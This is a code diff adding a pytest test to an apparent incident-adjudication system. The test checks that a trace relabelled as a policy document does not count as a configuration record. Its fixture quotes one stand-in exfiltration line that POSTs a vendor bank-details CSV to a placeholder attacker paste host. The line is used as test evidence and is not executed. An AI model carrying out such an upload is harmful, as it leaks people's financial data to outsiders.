@@ -309,6 +309,26 @@ def test_a_misconfiguration_needs_a_record_of_configuration(court, direct_vm, wo
         {"PRESENT": []}
 
 
+def test_a_trace_declared_as_a_document_is_not_a_configuration_record(court, direct_vm,
+                                                                     world_ids):
+    """A declared category is a claim. Meridian's trace committed as a policy
+    document is still a trace, and a text category's label is not checked, so
+    it cannot stand in for a record of configuration."""
+    incident_id = file_case(court, direct_vm, "RC10")
+    trace = CASES["RC01"]["evidence"][2]
+    commit(court, direct_vm, incident_id, [dict(trace, category="POLICY_DOCUMENT",
+                                                submitter="reporter")], "harbor")
+    warp(direct_vm, later(86400 + 1))
+    answer = answer_for("RC10")
+    answer["indicators"]["CONTROLLER_MISCONFIGURATION"] = {
+        "state": "PRESENT", "note": "", "quotes": [
+            {"evidence_id": "E3", "text": "POST vendor_bank_details.csv to "
+                                          "https://paste.attacker.example/drop"}]}
+    record = adjudicate(court, direct_vm, incident_id, answer)
+    assert finding(record, "CONTROLLER_MISCONFIGURATION")["state"] == "UNDETERMINED"
+    assert record["verdict"] == "LIKELY_EXTERNAL_FAILURE"
+
+
 def test_a_configuration_record_carries_a_misconfiguration(court, direct_vm, world_ids):
     """The mirror: Meridian's own access record shows the Docfetch grant
     allowed POST - an admission against the controller's interest, and a
